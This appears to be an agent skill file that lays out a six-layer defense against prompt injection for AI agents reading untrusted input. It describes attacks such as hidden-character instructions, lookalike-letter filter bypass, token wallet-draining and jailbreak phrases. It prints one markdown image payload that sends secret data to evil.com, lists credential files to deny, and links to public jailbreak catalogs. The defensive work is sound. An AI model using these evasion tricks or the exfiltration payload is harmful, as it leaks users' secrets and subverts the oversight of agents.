---
name: prompt-injection-defense
description: Implement a 6-layer prompt injection defense system for AI agents processing untrusted input (emails, webhooks, chat, web pages). Use when building security systems to protect against prompt injection attacks, jailbreak attempts, data exfiltration, and unauthorized tool calls. Based on Matthew Berman's OpenClaw defense architecture with 2,800 lines of defense code and 132 tests.
---

# Prompt Injection Defense System

A production-ready 6-layer defense system for AI agents processing untrusted input.

**Source**: Matthew Berman's OpenClaw defense architecture  
**Reference**: See `references/matthew-berman-defense.md` for complete technical details

---

## Quick Start

For the 80/20 version, implement these 4 layers:

1. **Layer 1**: Text sanitization (deterministic, free)
2. **Layer 2**: Frontier scanner (LLM-based risk scoring)
3. **Layer 5**: Runtime governance (spend/volume limits)
4. **Layer 3**: Outbound content gate (prevent data leaks)

---

## Architecture Overview

```
Untrusted input
  → Layer 1: Text sanitization (pattern matching, Unicode cleanup)
  → Layer 2: Frontier scanner (LLM-based risk scoring)
  → Layer 3: Outbound content gate (catches leaks)
  → Layer 4: Redaction pipeline (PII, secrets cleanup)
  → Layer 5: Runtime governance (spend caps, volume limits)
  → Layer 6: Access control (file paths, URL safety)
```

**Principle**: Cheapest first. Most attacks caught at Layer 1 (free) never reach Layer 2 (costs money).

---

## Layer 1: Deterministic Sanitization

**Cost**: Free | **Speed**: Instant | **Catches**: Majority of attacks

11-step pipeline that runs before any LLM sees the text:

### 1.1 Invisible Character Removal
Strip Unicode characters invisible to humans but readable by LLMs.

**Attack example**:
```
"Hi, I'd love to sponsor your channel"
[hidden instructions between every visible character]
```

### 1.2 Wallet Drain Protection
Certain Unicode characters tokenize to 3-10+ tokens each.

**Impact**: 3,500 characters could cost 10,000-35,000 tokens vs 875 normal tokens.

### 1.3 Lookalike Character Normalization
Characters from other alphabets look identical to Latin letters but have different codepoints.

**Example**: `system:` with lookalike 's' bypasses regex filters.

**Defense**: Normalize ~40 lookalike pairs before pattern matching.

### 1.4 Token Budget Enforcement
Character count ≠ Token count.

| Content Type | 3,500 Chars | Tokens |
|-------------|-------------|--------|
| Normal ASCII | 3,500 | ~875 |
| Dense Unicode | 3,500 | ~35,000 |

### 1.5-1.11 Additional Steps
- Combining mark cleanup
- Base64/hex block detection
- Statistical anomaly detection
- Role marker pattern matching
- Jailbreak command detection
- Code block stripping
- Hard character limit fallback

**Implementation**: See `scripts/layer1_sanitizer.py`

---

## Layer 2: Frontier Scanner

**Cost**: Low | **Model**: Use strongest available | **Thresholds**: 35 review / 70 block

Dedicated LLM classifier for semantic attack detection.

### Output Schema

```json
{
  "score": 0-100,
  "verdict": "allow|review|block",
  "categories": ["role_hijacking", "instruction_override", "social_engineering", "data_theft"],
  "reasoning": "...",
  "evidence": "..."
}
```

### Key Design Decisions

1. **Score overrides verdict**: If model says "allow" but score = 75 → block
2. **Fail behavior**: High-risk sources (email/webhook) fail closed; low-risk fail open
3. **Use strongest model**: Best models = hardest to hijack + best at detecting hijacks

**Implementation**: See `scripts/layer2_scanner.py`

---

## Layer 3: Outbound Content Gate

**Cost**: Free | **Purpose**: Prevent data exfiltration

Scans everything before it leaves the system.

### Check Categories

| Category | Patterns Detected |
|----------|-------------------|
| Secrets | API keys (Google, OpenAI, xAI, Slack, GitHub, Telegram), auth tokens |
| Internal Paths | File paths, internal network addresses |
| Injection Artifacts | Role prefixes, override phrases, special tokens |
| Data Exfiltration | Embedded image URLs with stolen data: `![img](https://evil.com/steal?data=SECRET)` |
| Financial Data | Dollar amounts (configurable allowlist) |

**Implementation**: See `scripts/layer3_outbound_gate.py`

---

## Layer 4: Redaction Pipeline

**Cost**: Free | **Purpose**: Clean outbound notifications

Three modules chained together:

### 4.1 Secret Redaction
Catches API keys and tokens across 8 common formats → `[REDACTED]`

### 4.2 PII Redaction
- Personal emails (gmail, yahoo, etc.) → filtered
- Work emails → allowed
- Phone numbers → redacted
- Dollar amounts → redacted

### 4.3 Notification Pipeline
Chains both modules before Telegram/Slack/email delivery.

**Implementation**: See `scripts/layer4_redaction.py`

---

## Layer 5: Runtime Governance

**Cost**: Free | **Critical Insight**: Bugs burn more money than attacks

Four protection mechanisms wrapping every LLM call:

### 5.1 Spend Limit
- Warning: $5 in 5 minutes
- Hard cap: $15 in 5 minutes (rejects until cooldown)

### 5.2 Volume Limit
- Global: 200 calls / 10 minutes
- Per-caller overrides:
  - Email extractor: 40
  - Frontier scanner: 50

### 5.3 Lifetime Limit
- Default: 300 calls per process
- Simplest loop stopper

### 5.4 Duplicate Detection
- Hash cache of recent prompts
- Returns cached response instead of new call
- Handles restarts, retries, scheduling overlaps

**Real-world failures caught**:
- Corrupted cursors
- Retry storms
- Cron overlaps
- "These aren't attacks. They're Tuesday."

**Implementation**: See `scripts/layer5_governor.py`

---

## Layer 6: Access Control

**Cost**: Free | **Purpose**: Prevent file/URL-based attacks

### 6.1 Path Guards
- Deny list: `.env`, `credentials.json`, SSH keys, sensitive extensions
- Allowed directories check
- Symlink following prevention

### 6.2 URL Safety
- Only http/https allowed
- Hostname resolution check against private/reserved ranges
- DNS rebinding protection

**Implementation**: See `scripts/layer6_access_control.py`

---

## Design Principles

### 1. Independence
> "No single layer is enough, and if any layer depends on another working correctly, the whole system is fragile."

Each layer must work independently.

### 2. Fail Closed
High-risk sources (email, webhook) block when scanner fails.

### 3. Centralization
Four shared choke points:
1. Sanitize before LLM
2. Scanner behind single entry point
3. Governor wraps shared LLM client
4. Outbound gate before any message leaves

### 4. Defense in Depth
Layer independence means gaps in one layer are caught by others.

---

## Attack References

Hardened against these open-source attack repositories:

| Repository | Content |
|------------|---------|
| [L1B3RT4S](https://github.com/elder-plinius/L1B3RT4S) | Jailbreak catalog |
| [P4RS3LT0NGV3](https://github.com/elder-plinius/P4RS3LT0NGV3) | 79+ encoding/steganography techniques |
| TOKEN80M8/TOKENADE | Wallet-draining payloads |

---

## Implementation Checklist

- [ ] Layer 1: Implement 11-step sanitizer
- [ ] Layer 2: Set up frontier scanner with strongest model
- [ ] Layer 3: Configure outbound content patterns
- [ ] Layer 4: Set up redaction pipeline
- [ ] Layer 5: Implement governor with spend/volume/duplicate limits
- [ ] Layer 6: Configure path guards and URL safety
- [ ] Write tests using real attack payloads
- [ ] Set up nightly security review

---

## Scripts Reference

| Script | Purpose | Status |
|--------|---------|--------|
| `scripts/layer1_sanitizer.py` | Deterministic text sanitization | ✅ Implemented |
| `scripts/layer2_scanner.py` | LLM-based frontier scanner | ✅ Implemented |
| `scripts/layer3_outbound_gate.py` | Outbound content filtering | ✅ Implemented |
| `scripts/layer4_redaction.py` | PII and secret redaction | ✅ Implemented |
| `scripts/layer5_governor.py` | Runtime governance | ✅ Implemented |
| `scripts/layer6_access_control.py` | Path and URL access control | ✅ Implemented |

**Total**: ~60KB of defense code across 6 layers

---

## Test Results

All layers tested and working:

```bash
# Test all layers
python3 scripts/layer1_sanitizer.py --test
python3 scripts/layer2_scanner.py
python3 scripts/layer3_outbound_gate.py
python3 scripts/layer4_redaction.py
python3 scripts/layer5_governor.py
python3 scripts/layer6_access_control.py
```

---

## Complete Usage Example

```python
from scripts.layer1_sanitizer import TextSanitizer
from scripts.layer2_scanner import FrontierScanner
from scripts.layer3_outbound_gate import OutboundGate
from scripts.layer4_redaction import RedactionPipeline
from scripts.layer5_governor import CallGovernor, GovernorConfig
from scripts.layer6_access_control import AccessController

# Layer 1: Sanitize input
sanitizer = TextSanitizer(token_budget=4000)
cleaned, stats = sanitizer.sanitize(untrusted_text)

# Layer 2: Scan for semantic attacks
scanner = FrontierScanner(llm_fn=your_llm_function)
scan_result = scanner.scan(cleaned, source='email')

if not scan_result['allowed']:
    print(f"Blocked: {scan_result['reason']}")
    return

# Layer 6: Check file/URL access (if applicable)
access = AccessController(allowed_directories=['/safe/path'])
if file_path:
    result = access.check_path(file_path)
    if not result.allowed:
        print(f"Access denied: {result.reason}")
        return

# Layer 5: Wrap LLM call with governance
governor = CallGovernor()
def llm_call(prompt):
    return your_actual_llm(prompt)

result = governor.call(prompt, llm_call, estimated_cost=0.01)
if not result['allowed']:
    print(f"Governor blocked: {result['reason']}")
    return

response = result['response']

# Layer 3: Check outbound content
gate = OutboundGate()
outbound_check = gate.scan(response)
if not outbound_check['clean']:
    print(f"Outbound violations: {outbound_check['violations']}")

# Layer 4: Redact before sending
pipeline = RedactionPipeline()
safe_response = pipeline.notification_pipeline(response)
```

---

## References

- `references/matthew-berman-defense.md` - Complete technical details from original article
- `references/attack-patterns.md` - Common prompt injection techniques
- `references/owasp-llm.md` - OWASP LLM Prompt Injection Prevention Cheat Sheet
